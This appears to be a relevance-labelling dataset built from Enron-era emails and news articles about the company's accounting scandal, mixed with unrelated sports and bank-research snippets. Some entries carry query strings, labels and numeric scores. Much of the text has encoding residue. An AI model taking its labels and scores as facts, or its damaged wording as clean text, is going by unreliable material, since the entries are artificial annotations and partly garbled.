Oct. 25, all but two of =17 analysts were giving Enron stock a thumbs-up.=20Even if the nation's laws weren't so permissive, Enron very well may have m=et the same end. In a free-market economy, no business is guaranteed a succ=essful future. But Berardino's defense that he couldn't find any illegality= among all of these acts provides little solace to the thousands of Enron e=mployees and countless investors who banked on Enron and Andersen for hones=t numbers and lost billions. Had everyone involved used an ethical compass,= rather than a strictly legal one, investors would have been armed with acc=urate information about Enron's business and the risks it entailed when dec=iding whether or not to buy its stock.=20",0.0,0.5,0.9,0.0

Chairman Wood called this case for discussion to highlight a change in Commission policy.  In this case, FERC is imposing the gas model for penalty revenue crediting to electric transmission providers.  Described as a ""market based imbalance solution,"" the prospective change requires that revenues from imbalance penalties should be credited back to non-offending customers.  The exact mechanism for such crediting has not been outlined in the Carolina order.  Commissioner Brownell reiterated that this approach ""sends the right economic signals"" to transmission customers to stay in balance.

mark to market accounting practices,1,"A 'Very Difficult Time' Some audit controls, such as using computers to spot financial conflicts of interest with prospective clients, improved during four years of SEC prodding, Bowsher said. Other shortcomings continue because of resistance in the accounting industry, he said. ""We were pushing on some of these issues, but we were having a very difficult time having these things improved,'' Bowsher said in an interview. Peer reviews and accounting oversight are in the forefront of debate about audit regulations in the wake of Enron's collapse. The energy trader blamed bookkeeping errors, in financial statements certified by Andersen, for the need to restate earnings going back to 1997. Still, Andersen got unqualified good marks in its latest peer review, released Jan. 2. Andersen's reviewer, Deloitte & Touche LLP, looked at 240 audits after Andersen asked its rival for tougher-than-normal scrutiny while questions swirled about Enron. Enron's audit was not among those examined.Pitt's Proposal Pitt's outline for change calls for the SEC to work with the biggest accounting firms to create a private oversight body, with funding from outside the accounting industry, to monitor and discipline auditors. Former SEC Chairman Arthur Levitt, who appointed Turner, said last week that Pitt's proposal ``needs more teeth.'' An April 1997 letter, the earliest released under the freedom of information request, questioned whether cost saving in the name of efficiency was hurting the quality of audits and producing fewer records than peer reviewers needed. ""Some changes being undertaken in pursuit of operating goals, such as reducing audit hours and focusing audit objectives on increasing the perceived value of the audit to client management, may have the effect of compromising audit quality,'' wrote Michael Sutton, who was then SEC's chief accountant. He declined to comment on the letters.Peer Review",0.0,0.5,0.8,0.2

In addition, IASB expects to tackle aproject on business combinations quickly and hopes to have it done incomparatively short order. The focus of the planned work on merger andacquisition accounting would be to consider barring the pooling-of-interestsmethod of accounting and adopt the purchase method instead. IASB also plansto target the treatment of goodwill, a key element in purchase accounting,and weigh a possible adoption of impairment against the survival of thewritedown of goodwill acquired in a combination.As with all standard-setting projects and less substantial efforts, theboard has its eye on convergence. It is working toward issuing a single setof high quality accounting rules that could be used by companies around theworld in raising capital.Heavy Involvement of National BoardsThe path to that goal will include heavy involvement of major nationalstandard-setting bodies in the rulemaking of IASB. The mechanisms for thatwork--which are to include joint projects and other ""partnership workingarrangements""--were detailed in a meeting May 24 with the heads ofstandard-setting panels from Australia, Canada, France, Germany, Japan, NewZealand, the United Kingdom, and the United States. IASB has formal""liaison"" relationships with those boards.A sharing of human resources by the sparely staffed IASB and groups such asthe U.S. Financial Accounting Standards Board would be complemented by atrading of knowledge, the rulemakers suggested.

The Enron executive then raised those same concernsin a conversation with an unidentified Andersen partner. Andersen wasassured by Enron that an outside law firm had been hired to look into theallegations.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"The company's trials have just begun LAWYERS are swarming all over Enron's old financial statements and press releases in the hope of reaping huge fees from securities litigation. More than 20 class-action lawsuits have been filed in recent weeks, and new ones are popping up every day. A formal process has been started to consolidate litigation in Houston, where the troubled energy company is based, with all lawyers interested in the case required to stake their claims by December 21st.The broadest accusations will be of fraud and material misstatement, legal ways of saying that the company's financial statements were garbage. This week, Enron's founder and chairman, Kenneth Lay, decided to forgo a severance package worth over $60m while admitting that the company's problems ""had been exacerbated by the extensive use of debt capital, both on and off the balance sheet"". America's Financial Accounting Standards Board (FASB) is looking again at off-balance-sheet financing, having fretted about it on and off for a decade. There will also be charges of insider trading, because even as Enron was issuing securities amid glowing profits reports, top executives were dumping over $1 billion of Enron shares to ""unsuspecting investors"", a group that includes anybody who, however briefly, has held one of the company's 750m shares in the past two years. ""The number of class members will be huge,"" says Maurice Pesso, a lawyer at a New York firm that has filed a claim. There are, however, limits to the company's liability. It has already restated its results going back five years, but federal law restricts litigation to the past three. Moreover, Enron will not take the rap alone. Its auditor, Arthur Andersen (now plain Andersen), is also named as a defendant in at least one of the complaints already filed. The litigation comes after a rough decade for Andersen. It has had to pay hundreds of millions of dollars in settlements after sloppy audits on such companies as Waste Management, Sunbeam and Discovery Zone. Because Enron evolved from an energy company into a financial firm, it became much like an unregulated bank. The lack of supervision meant that the role of the company's auditor was crucial. Andersen was certainly paid as if it was. In 2000, it collected $25m for auditing Enron's books and another $27m for consulting services. Now how do you account for that?Copyright ? 2000 Dow Jones & Company, Inc. All Rights Reserved.

Western peak power prices slid substantially on Wednesday, primarily on
reduced holiday-weekend loads.  Players traded a Thursday-through-Saturday
package on Wednesday to accommodate the Christmas holiday on Tuesday,
December 25.  Players will schedule for Sunday and Monday on Thursday, and
for Tuesday and Wednesday on Friday.  No prescheduling will take place in
the WSCC on Christmas Eve or Christmas Day.  Other factors helping to push
the dailies lower were abundant Northwest hydropower and slightly lower spot
gas prices.  ""Between now and the new year many traders will be out of the
office and loads will remain at holiday levels, so we don't expect much

mark to market accounting practices,0,"The significance of special charges -- whether they represent old baggage from the past or illuminate the future -- is at the center of a lively debate under way in the accounting world. One side holds that generally accepted accounting principles, or GAAP, provide the best available snapshot of a company's financial position. GAAP, which companies must use in their official financial statements, requires that nearly all charges be treated as ordinary expenses. Others, including many stock analysts, contend the best view comes from ""pro forma"" financial results -- calculated ""as if"" many expenses didn't really exist. The idea is that these expenses aren't relevant to future performance. Companies increasingly highlight the pro forma view in news releases they generally put out before their official filings with regulators. But pro forma calculations adhere to no particular standard. Companies essentially do what they want. Now, accountants and economists say the practice of excluding blemishes is so widespread that companies and analysts often guide investors to dismiss charges that contain prescient warnings -- like the one at Bethlehem Steel. Ms. Applebaum, the Salomon Smith Barney analyst who played down Bethlehem's big write-off, explains that she has covered other steel companies that returned to profitability shortly after writing off deferred tax assets. She thought Bethlehem would do the same. She notes that GAAP rules on such assets obliged Bethlehem to follow strict criteria in assessing its chances of future profitability -- stricter criteria than stock analysts typically use. As for Bethlehem, Chief Financial Officer Leonard M. Anthony says the charge the company took was to some extent ""predictive of the future."" GAAP also has well-established standards for writing down other kinds of assets. Companies must reduce the value on their books of anything from a customer loan to a manufacturing plant when its worth has diminished. Again, Wall Street stock analysts tend to dismiss the resulting charges as one-time events. Sometimes that makes sense. During the 1981-82 recession, restructuring was a part of many corporations' strategies. They took charges for streamlining, outsourcing and otherwise shedding costs to position themselves for recovery. Because the resulting earnings volatility made it hard to compare companies' growth rates or price-earnings ratios, and because the charges weren't expected to recur, there was logic to excluding them to come up with ""smoothed"" earnings trends. ""Investors came to look upon the charges, correctly in many cases, as evidence that those firms had recognized past mistakes and had made tough decisions to become more efficient,"" said a September 2001 study by the Jerome Levy Economics Institute at Bard College in Annandale-on-Hudson, N.Y.",0.0,0.0,0.7,0.2

Subject: Update on Electricity Restructuring Legislation

Ginger - please forward to the folks in Rick's group.  Many thanks.


Here's an update on the recent developments on electricity restructuring 
legislation in the House and Senate.  Two legislative mark-up vehicles have 
been unveiled, HR 2944 and a Senate bill sponsored by Senator Murkowski that 
has yet to be formally introduced.  On Tuesday and Wednesday of last week, 
the Energy and Power subcommittee held the legislative hearings on 
Congressman Barton's bill, HR 2944.  Betsy Moler testified on behalf of AAE 
and her testimony is attached, along with a one page summary, and a copy of 
our proposed amendment submitted to the subcommittee.  We support the Barton 
bill, if and ONLY if, this amendment is incorporated.  Currently, the outlook 
is very positive that the amendment will be adopted and the legislation will 
move forward for full House consideration.  We need your support to contact 
state advocates in order to get them to support this amendment.

The second piece of electricity legislation was released last Thursday and 
the draft legislative language is attached.

We feel very positive that we can pass electricity legislation this Congress 
(ie. next year).   We see the critical pitfall as subcommittee action, but 
remain confident that enactment is possible.  We will be sure to keep you 
updated on any developments as they occur and appreciate your continued hard 
work in the states to help push federal legislation.

Thanks.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"The 217-page report of a special investigative committee of the board of th=e Enron Corporation, released late Saturday, provides the first independent= assessment of what went wrong at the company, which filed for bankruptcy i=n early December. Here are the principal findings. DIANA B. HENRIQUES=20CONFLICTS OF INTEREST -- Senior executives who owed their primary allegianc=e to Enron and its shareholders participated in a number of private partner=ships that did business with Enron. Through the partnerships, these executi=ves, including Andrew S. Fastow, the chief financial officer, and Michael J=. Kopper, who worked with him, were enriched, in the aggregate, by tens of =millions of dollars they should never have received.INADEQUATE DISCLOSURE AND ACCOUNTING ERRORS -- Enron disclosed the existenc=e of one set of partnerships, LJM1 and LJM2, to its shareholders. However, =these disclosures were obtuse, did not communicate the essence of the trans=actions completely or clearly, and failed to convey the substance of what w=as going on between Enron and the partnerships.=20Certain transactions allowed Enron to manipulate its publicly reported earn=ings, to offset and conceal very large losses and, from September 2000 thro=ugh September 2001, to report profits that were almost $1 billion higher th=an should have been reported.=20The accounting treatment for some partnerships was clearly wrong, apparentl=y the result of mistakes either in structuring the transactions or in basic= accounting. In other cases, the accounting treatment was likely wrong. As =a result, business entities that should have been included in Enron's finan=cial statements were not disclosed. A set of entities called the Raptor par=tnerships were instrumental in Enron's systematic concealment of its losses= and inflation of its earnings.=20A FAILURE AT THE TOP -- Procedures that were set up to police the potential= conflicts in the partnerships' dealings with Enron were not rigorous enoug=h and were inadequately monitored by both senior management and the board. =Individually, and collectively, Enron's management failed to carry out its =substantive responsibility for ensuring that the transactions were fair to =Enron -- which in many cases they were not.=20The captain of the ship, Kenneth L. Lay, functioned almost entirely as a di=rector, and less as a member of management.=20Jeffrey K. Skilling, although he certainly knew or should have known of the= risks associated with these transactions, he did not monitor them, even af=ter Enron's treasurer, Jeffrey McMahon, told him in March 2000 that he had =serious concerns about Enron's dealings with the LJM partnerships.=20Richard Causey, Enron's chief accounting officer, presided over a series of= accounting judgments that went well beyond the aggressive and failed to pr=ovide the board with sufficient information about transactions.=20",1.0,0.8,0.9,0.8
mark to market accounting practices,1,"re. They may be incentivized, then, to overlook some particularly aggressiv=e accounting treatment suggested by their clients.=20Outside auditors also frequently perform and review the inside audit functi=on within the corporation, as was the case with Andersen and Enron. Such a =situation may weaken the safeguards that exist when two independent organiz=ations examine complicated transactions. It's as if a professor let student=s grade their own papers and then had the responsibility to hear any appeal=s. Auditors may also be influenced by the prospect of future employment wit=h their clients.=20Unfortunately, our existing self-regulatory and standard-setting organizati=ons fall short. The American Institute of Certified Public Accountants has =neither the resources nor the power to be fully effective. The institute ma=y even have contributed to the problem by encouraging auditors to ""leverage= the audit"" into advising and consulting services.=20The Financial Accounting Standards Board has often emphasized the correct f=orm by which individual transactions should be reported rather than the sub=stantive way in which the true risk of the firm may be obscured. Take ""Spec=ial Purpose Entities,"" for example, the financing vehicles that permit comp=anies such as Enron to access capital and increase leverage without adding =debt to the balance sheet. Even if all of Enron's SPEs had met the narrow t=est for balance sheet exclusion (which, in fact, they did not), our account=ing standard would not have illuminated the effective leverage Enron had un=dertaken and the true risks of the enterprise.=20Given the complexity of modern business and the way it is financed, we need= to develop a new set of accounting standards that can give an accurate pic=ture of the business as a whole. FASB may have helped us measure the indivi=dual trees but it has not developed a way to give us a clear picture of the= forest. The continued integrity of the financial reporting system and our =capital markets must be insured. We need to modernize our accounting system= so financial statements give a clearer picture of what assets and liabilit=ies on the balance sheet are at risk. And we must find ways to lessen the c=onflicts facing auditors, security analysts, and even boards of directors t=hat undermine checks and balances our capital markets rely on.=20One possibility is to require that auditing firms be changed periodically t=he way audit partners within each firm are rotated. This would incentivize =auditors to be particularly careful in approving accounting transactions fo=r fear that leniency would be exposed by later auditors.=20And, in the end, we need to create a powerful and effective self-regulatory= organization with credible disciplinary authority to enforce accounting ru=les and standards. It would be far better for the industry to respond itsel=f to the current crises than to await the likelihood that the political pro=",0.0,0.5,0.8,0.6
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Among the rules that Enron now acknowledges it didn't follow were the accou=nting standards that applied to the complex partnerships it created. The pu=rpose of the partnerships, Enron said, was to reduce the risks of investmen=ts in Internet transmission systems and to sell power plants and other asse=ts it no longer wanted.=20The accounting errors were described in a 20-page SEC filing Enron made Thu=rsday. The errors resulted in a $1.2 billion reduction in the value of shar=eholders' equity. The company also said it had overstated its earnings by $=586 million since 1997.=20Enron created partnerships that would buy major assets -- such as a power p=lant -- that Enron wanted to sell, or in other cases, assets such as fiber-=optic cable networks that Enron intended to run but did not want to have on= its balance sheet.=20The partnerships had outside investors, but the general partner of two of t=hem was Enron's own chief financial officer, Andrew Fastow. He earned $30 m=illion in fees from managing two of the largest partnerships, according to =the SEC document.=20Enron added to the capital of these partnerships by pledging its stock, or =securities convertible into stock. Some of those stock transactions should =have been counted as loans, resulting in the $1.2 billion drop in sharehold=er equity, Enron now says.=20Investors are asking why Enron's auditor, Arthur Andersen LLP, did not insi=st that these transactions be handled that way in the first place. Enron's =SEC filing mentions but does not explain some ""proposed audit adjustments"" =over the past four years that were overruled.=20Even though, as Enron now acknowledges, it created an information barrier, =masking critical information and violating standard accounting rules, many =financial analysts who were recommending the stock to investors were not pu=shing hard enough to punch through that barrier, some analysts acknowledge.==20""It was so complicated that everybody was afraid to raise their hands and s=ay, 'I don't understand it,' "" Gagliardi said.=20The questions are now coming, from a new committee reporting to Enron's boa=rd that will investigate how the company's financial reporting was handled;= from the SEC; and, eventually, from teams of lawyers representing aggrieve=d shareholders.=20Lay indicated yesterday he had not been aware until recently that Enron emp=loyees other than Fastow had profited from the partnership activity.

by John Filar Atwood, equity research columnist

Worsening economic conditions have caused a major strategic shift in the mobile 
handset industry. The segments top companies have begun to de-emphasize phone 
sales and are eyeing the wireless Internet as a key driver of future revenues.

were down by 10% over last year. Motorolas (MOT) sales fell by 22% in the quarter, 
and Ericssons (ERICY) phone operations have been so damaging to its bottom line 
that the company finally moved them into a joint venture with Sony (SNE).

The Times posted net earnings of $43.8 million in the 3 months ended September 30, down 42% from $75 million in the same period in 2000. Total revenues fell 9%, compared to $767.7 million in the same period in 2000 and were led by a decline of 16% in advertising revenues. On a positive note, for all of September, average daily circulation of the paper increased by about 130,000 copies, and NY Times is hopeful that a good portion of the new readers will stay with the Times, adding to its circulation base. This earnings decrease was expected, as many leading publishers have been hurt by a advertising slump and the September attacks.Ayesha",0.0,0.0,0.5,0.0

I know how incredibly busy you all are, so I'm sure that making a pledge to Jeff for the MS150 has simply slipped your mind.  Well the ride is this weekend, time is running out and we need you!

Enron's goal is to raise $700,000, and Jeff's personal goal is to raise $50,000.  As of today, we are a little better than half way there.  Won't you consider helping him reach his goal?

Thanks for your consideration.  I look forward to hearing from you tomorrow...

mark to market losses,0,"Subject: Re: Hot List ItemsEdie,I have left the following (in part) on Roger Ondreko's voice mail last week. Here is the wrap-up for the remainder of Q'4.Chicago-/Origination/Hub/Trading - $1.7MM (down from $2.8MM) Two transactions have been terminated as follows: 1) QNT Management with PGL/NS - Proceeds mark to market were to be $480,000 to Enron. Due to recent filing with the Illinois Commerce Commission on affiliate transactions, it was deemed that this transaction may bring too much scrutiny to enovate. For 2000, approximately 80% of business to PGL/NS are being transacted with either ENA, EMW or enovate. Net loss $480,000 mark-to-market with potential accrual value in the $100,000 to $500,000 range. 2) LS Power Plant - At execution stage for fuel balancing for combined cycle power facility with both Williams and LS who were both deemed as counterparties on transaction. Williams' board of directors did not approve the purchase of facility and LS has now sold to NRG (November 7, 2000). Transaction now becomes a 2001 deal with high probability of closure. Net loss of 4th quarter mark-to-market $1.5MM and accrual upside. 3) Off-Balance Sheet Financing/Gas Supply Receivable - Due to cash short fall for PEC, ENA was to extend $50MM of receivables for 2 months under the ENA/PGL gas supply agreement through an Enron Global Finance off-balance sheet vehicle. ENA was to receive 200 basis points of origination, netting $165,000 to Chicago, with no negative cash flow or balance sheet implications to Enron.Storage Monetization - Move to 1st Quarter 2001 Peoples Energy received short term financing to get them through their end of year cash flow issues, which pushes the transaction to 2001. On the positive, the Peoples Board of Directors approved capital spending for oil and gas properties of $60MM for 1st quarter 2001 and our structure on the monetization provides them competitive off-balance sheet financing. Higher gas prices in years 2 and 3 due to greatly diminishing backwardation in Chicago basis and Nymex have increased the value of the transaction approximately $12MM in the past two weeks. Value to Enron in 2001 $5MM to $25MM.The numbers must be looked at in entirety for Chicago and not broken down Origination/Trading on the receipt to Houston. The $1.7MM is the gross Enron number for Chicago for 4th quarter, 2000. In the $1.7MM, there will be mid-market transactions and trading, with the trading number daily reflecting the risk associated with a trading P&L.In respect to the overall Chicago numbers, please ensure you are picking up enovate books and Chicago origination which are granted via 1) central desk 2) EMW and 3) East Origination.Please contact me if you have further questions or need further clarification.Edie Leschber@ECT12/12/2000 05:16 PM",0.5,0.0,0.8,0.6

Investors lost $2.61 billiontoday alone as the stock plunged $3.50, or 85 percent, to 61 centsa share. The stock has posted the biggest decline in the Standard &Poor's 500 Index this year, meaning fund managers with over $1trillion invested in portfolios that try to mimic the benchmarkhave followed the stock down. Enron's decline today prompted Standard & Poor's to kick thecompany out of the S&P 500, used by most professional investors asa benchmark for U.S. stocks. The company will be removed when themarket closes tomorrow. Index managers, who mimic the makeup of the S&P as closely aspossible, will sell at that time. Other investors are likely tosell as well, if they haven't already, because money managers whopick stocks based on their evaluation of a company's earningsprospects often prefer to stick to stocks that are in the index toensure their performance doesn't lag the benchmark. Barclays Global, the biggest manager of index portfolios,will sell the stock from S&P 500 index funds, said spokesman TomTaggart.

About 88 percent of that stake was in indexor index-like funds, she said. ``We would follow whateverrebalancing is done in the index,'' she said. The California Public Employees' Retirement System, thebiggest U.S. employee pension fund with about $144 billion inassets, owns about 3 million Enron shares, most of them in anindex fund, said spokesman Brad Pacheco. He said the losses won'thurt Calpers overall. ``You're going to have winners and losers,'' Pacheco said.``It's minimal compared to our entire portfolio.''

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Enron's credit rating has been downgraded by Fitch Inc., Standard & Poor's and Moody's Investors Service, with Fitch on Monday taking the company's credit to BBB-, one level above noninvestment grade. Fitch analyst Ralph Pellecchia said his agency would drop Enron to junk status if the company made no progress in reducing its debt, if its trading business were to show signs of significant deterioration or if expenses and charges from noncore businesses it is selling should exceed current estimates. A rating below investment grade would present further obstacles to Enron's ability to continue making markets in electricity and natural gas supplies. A fall below investment grade also would trigger early repayment of $3.3 billion in bonds that otherwise would not be due until 2002 and 2003. ""There are a lot of things they can do that people might perceive as being positive,"" Pellecchia said. ""They are trying to show that they have the cash available and the capacity of managing their businesses over time, of getting out of bad businesses and running their business more openly and transparently. Obviously, this is a process."" Enron's troubles have cascaded of late. The company reported a $618-million loss in the third quarter and a $1.2-billon reduction in shareholder equity--after two years in which its annual revenue more than trebled. The company led a trend in energy trading, creating an Internet-based network, EnronOnline, that allowed millions of suppliers and purchasers of electricity, natural gas, oil and coal to trade with one another. Enron made markets in all those commodities, putting up its own capital to buy and sell them. It is that key role as a clearinghouse that has put Enron in greatest peril because it needs a continuing flow of cash to act as ""the buyer for every seller and the seller to every buyer,"" said Philip K. Verleger Jr., a Newport Beach energy economist. ""Enron is now trying to reach out to other people to get them to fund this EnronOnline ... but a lot of companies have been moving business out of Enron,"" he said. Ironically, California is in the position to help push Enron deeper into trouble, Verleger said. That is because Enron is owed millions of dollars by California for electricity sold to the state and its utilities during the power crisis, and Enron, in its role as market maker, probably has a hand in many of the controversial long-term power contracts signed this year by the state. Gov. Gray Davis, other politicians and state regulators have repeatedly accused Enron of overcharging for electricity. ""If Gray Davis were to pull the plug on the state's electricity deals with Enron or other firms, he quite possibly could put Enron into bankruptcy,"" Verleger said.

Bengals Head Coach Dick LeBeau said Monday he has not yet made a decision on the status of Rackers, who missed two field-goal chances Sunday. He is 9-for-18 in field goals this season, and Jaret Holmes has been on the practice squad since Nov. 1. Rackers will likely retain the job for Sunday's game against Tampa Bay, but he's a very risky Fantasy starter based on his struggles.

Bengals Head Coach Dick LeBeau said Monday that Smith might be promoted to No. 2 quarterback, according to The Cincinnati Enquirer . ""If that's what they're going to do, maybe the Bengals need to get rid of me,"" Smith said, citing a desire to be traded if he's used in a mop-up role. He's not a recommended Fantasy choice, although it's important to note that he's now likely next in line if Jon Kitna gets hurt.

Allen, who remains out with a broken hand, could return to the lineup on Dec. 16. With the Ravens losing Jason Brookins to an injury, don't be surprised if Allen takes back the starting job once healthy. Hold onto him if you have the room on your reserve list or play in a deeper league.

Williams becomes the Ravens' featured back after the injury to Jason Brookins. If you play in a deeper league or are desperate for a running back, consider picking up Williams, although you shouldn't expect him to post great stats unless the matchup is very favorable.

Jason Brookins <http://football222.fantasy.sportsline.com/mp/elink?script=players&league=bige01&owner=14696.2&random=1504&key=192266&>, RB BAL - Tori Updated 11/27/01
Results of X-rays on Brookins' foot revealed a fracture of a bone in his small toe, which will sideline him for at least four weeks and possibly the rest of the season. Moe Williams becomes the Ravens' starting running back, and might be worth adding to your roster in a deeper league.

Hey team.

I just created deals 456630 (sale to New Power) and 456638 (buy from New 
Power) at the pool.  This is to record the gas ENA is buying back from New 
Power when there daily loads drop below the FOM numbers.  I'm using the 
following FOM numbers

1st-6th  51,762
7th-26th  41,762  New Power sold back 10,000 dth day 7th-31st
27th-31st 31,762 New Power sold Aquilla 10,000 dth 27th-31st

Using these numbers, ENA is only buying back a total of 164,031dth through 
the 25th.  Not as much as I thought.

This acquisition would buy us time and give us a jump start in developing our capacity trading tools but we also need to be aware that there will be additional costs going forward and potentially some issues with maintenance of the data feeds from the pipes if we don't finalize TPA's with all of the pipes.  -  Tommy

Mary Ellen,

Attached for your review is a revised copy of the ISDA Master Agreement 
between Enron North America Corp. and Louis Dreyfus Plastics LLC.  Some of 
the changes you requested have not been incorporated as some of our 
requirements have changed since the agreement between ENA and Louis Dreyfus 
Corporation was executed.  We are currently reviewing the form of guaranty 
forwarded by Louis Dreyfus Corporation and will have comments for you 
shortly.  Please contact either myself or Sara Shackleton to discuss.

We look forward to hearing from you.

More than20 securities lawsuits alleging illegal insider trading have beenfiled against the company. Lay pledged to provide more information on Enron'stransactions, starting with the third-quarter earnings report. On Oct. 16, Enron stunned analysts and investors with thedisclosure of $1.01 billion in losses from investments inbusinesses outside the main trading operation, such as in fiber-optics ventures and the Azurix water and sewage companies. ``Now you have a bankrupt company,'' said Rob Plaza, ananalyst at financial advisers Morningstar who owns no Enronshares. ``That is the smoke and mirrors of Enron.''Centrica May Have to Write off $43 Mln If Enron Fails (Update1)2001-11-29 09:10 (New York)Centrica May Have to Write off $43 Mln If Enron Fails (Update1) (Adds detail on contracts in first paragraph, shares infifth, background from sixth.) London, Nov. 29 (Bloomberg) -- Centrica Plc, the U.K.'sdominant natural-gas supplier, may have to write off gas andelectricity contracts worth 30 million pounds ($43 million) ifEnron Corp. goes out of business. The company agreed to a 10-year gas contract in 1998 with theU.S. energy trader, which may be forced into the biggest Chapter11 filing in history after Dynegy Inc. walked away from a rescue.Enron supplies the U.K. company with more than 5 billion cubicmeters of gas and an undisclosed amount of power. Centrica ``is working to reduce its trading exposure toEnron,'' it said in a Regulatory News Service statement. ``In theevent Enron defaults on its contractual obligations, we remainconfident in our ability to supply all our customers.'' Centrica, created in 1997 when it was spun off from BritishGas, still makes most sales from supplying the fuel to customersin the U.K. It meets about 20 percent of that demand with gas fromits own fields and buys the rest from other companies. Shares of the Slough, England-based company fell as much as4.25 pence, or 2.1 percent, to 202.75. They've lost a fifth oftheir value this year. Enron shares are now almost worthless. Enron provides gas to Centrica at prices linked to theInternational Petroleum Exchange natural gas futures contract. Last week, Slough, England-based Centrica agreed to pay 62.3million pounds for stakes in five natural gas fields in the NorthSea to replace dwindling reserves.Enron Evaluating Whether to Pay Quarterly Dividend (Update1)2001-11-29 08:44 (New York)Enron Evaluating Whether to Pay Quarterly Dividend (Update1) (Adds background on Dynegy withdrawal in third paragraph.)",0.0,0.5,0.7,0.6

[Fairley, David] There are three considerations on this: (1) who wears imbalance exposure?, (2) who manages imbalances (hourly type activity), and (3) who pays for imbalances? Imbalances are billed by Entergy directly to MDEA under their Network Services Agreement. EPMI's hourly desk manages the load/resource items hourly, but MDEA has the exposure (physical and price) to imbalances. Weather/load changes, and fluctuations in supply create hourly imbalances (they happen, they are uncontrollable, and we fix them) which EPMI's hourly desk manages as part of the imbalance service described in the definitions and obligations of the parties. A different section in the contract states that MDEA wears the exposure. How are we setting the bogey? Formula?

The following representations (among others) have been made to various parties in due diligence relative to both the credit agreement (with the banks) and the Preferred Stock Agreement (Dynegy) to the Boards of Transwestern (TW), Northern (NNG) and Enron Transportation Services (ETSC) and it subsidiaries, as well as to Dynegy and the banks:

The funds that are being loaned out of NNG and TW to various entities and the further loans of these funds to Enron will carry Enron Corp guaranties.
The note agreements will reimburse NNG, TW and ETSC and their subsidiaries for their actual expenses associated with these endeavors.
The credit agreements actually require a large degree of separateness and an arm's length standard needs to be applied to dealings between ETSC and its subsidiaries and Enron and the rest of it's subsidiaries.

Before the funding under the credit agreement takes place I would like to make sure that you two are aware of this, have agreed to and understand the conditions and further agree that you will assist me in cleaning up whatever documentation needs to be cleaned up between Enron and ETSC and it's subs to make the above representations not be false.

I agree with Danny's email that the key timetable issue for the incremental 
10,000/day appears to be lead time on fabrication and delivery of the 
15,000hp motor.  It was my understanding that the long lead time items were 
going to be ordered shortly (if they haven't been already) and that we'd take 
the financial risk.  If that is our approach, the regulatory approvals won't 
be the critical path item they usually are.  I've reviewed the FERC 
application and we should be able to file it shortly, perhaps with a request 
for temporary emergency certification if we decide that would expedite 
things.  Additionally, we are looking at transactions that would allow us to 
avoid physically hauling the 20,000/day of fuel down the San Juan lateral.  
If we could unload our fuel requirement from the San Juan, the additional 
horsepower at Gallup might provide some additional flexibility or additional 
capacity.   I'll talk to Steve today to make sure we are doing everything 
possible to expedite these efforts.  DF

Instea=d, it became the world's biggest corporate failure, filing for bankruptcy l=ast week.

A NEWSWEEK= examination of Enron's filings shows that the company's fatal mistake was =an unintended byproduct of one such deal. The transaction first inflated En=ron's reportednet worth, then deflated it. When the company cleaned up its =books this fall, it triggered the $1.2 billion net-worth write-down that to=uched off the downward spiral that led to bankruptcy.=20Enron looked like a well-oiled machine, but a lot of it seems to have been =jury-rigged. The company was housed in a spiffy 50-story building in downto=wn Houston, a structure whose elevators flashed Enron's latest stock price =and delivered upbeat messages to get employees pumped by the time they got =to their offices. In the best New Economy tradition, Enron had an on-site h=ealth club, casual dress and employees piling up paper wealth by investing =in Enron stock.But when things started going bad, Enron couldn't cope. It couldn't even fi=re people properly. Information-technology specialist Diana Peters says her= entire department was told to clear out on half an hour's notice and to ca=ll their office voice mail to see if they should return to work the next da=y. Very classy. ""I was crying, a lot of people were crying,"" says Peters, 5=1. ""It reminded me of a mass funeral.""=20The company even had trouble going broke. Normally, a company hoards cash i=n preparation for bankruptcy by accelerating collections from its customers= and slowing down payments to vendors. Enron didn't start doing that until =a few days before the filing, far too late. Enron almost became the Flying =Dutchman of the bankruptcy world. It wanted to file in Wilmington, Dela., b=ut the bankruptcy court there didn't want the case. So Enron ended up in Ne=w York City. And it was so short of cash that it had to scurry around to li=ne up $1.5 billion of so-called debtor-in-possession financing to keep the =place operating.

Hearings in the Republican-controlle=d House are set for this week, and will focus on accounting and stock analy=sts and the Securities and Exchange Commission rather than on Enron's polit=ical relationships and what, if anything, the White House did during Enron'=s final days.=20Although some details are still murky, one thing is clear: Arthur Andersen,= Enron's outside accountant, is in big trouble, and it (or its insurers) wi=",0.0,0.5,0.9,0.0

If the market has indeed put in a bottom over the last few days, be prepared
for us to 'retest' the lows. A successful test, is what is needed, followed
by a meaningful rally!
The market has already factored in most of the bad news from corporate
America. We may also see individual stocks rise after releasing bad news.
This would also prove to be very meaningful. Look to use this period to
upgrade portfolios.

Impact of Recession on Bank Trends (CD)
q Many expect that the precarious U.S. slowdown may already be in or tipping
toward recession after
the recent WTC incident. Regardless of whether the U.S. economy slips into
recession, it has been
undergoing a transition from rapid growth of the 1990s to a period of slow
growth. This transition
has created a challenging operating environment for banks.
q This week we take a look at historical bank trends before, during, and
after recessions.

Banks 		Jason Goldberg
Weekly Bank Facts (JG)
q The Lehman Brothers Bank Index ended the week down 7.2%. Our Large-Cap
Bank Index fell
11.2%, while the Mid-Cap Bank Index declined 6.7%.
q All major indices also were down this week. The S&P 500 fell 11.6%. The
Dow lost 14.3% and Nasdaq
was off by 16.0% for the week.

City National		 Brock Vandervliet
On Target With an Even Better Valuation 1 - Strong Buy / 39.85 (USD)
q Although the stock is still roughly 10% above where we upgraded it to
1-Strong Buy back in March,
it has retraced most of its intervening gains. Once again, we believe it
should be front and center
in any discussion with investors in the smaller-cap financials at this time.
q We carry a Q3 EPS estimate of $0.73 for CYN, expected to report October
12. Although confident in our
estimate this is $0.02 less than consensus.
q Given CYN's mildly asset sensitive positioning, we wouldn't be surprised
by some margin decline this
quarter, similar in magnitude to Q2.
q Due to the declining runoff of the non-relationship syndicated book, we
believe CYN's above average loan
growth should be increasingly visible

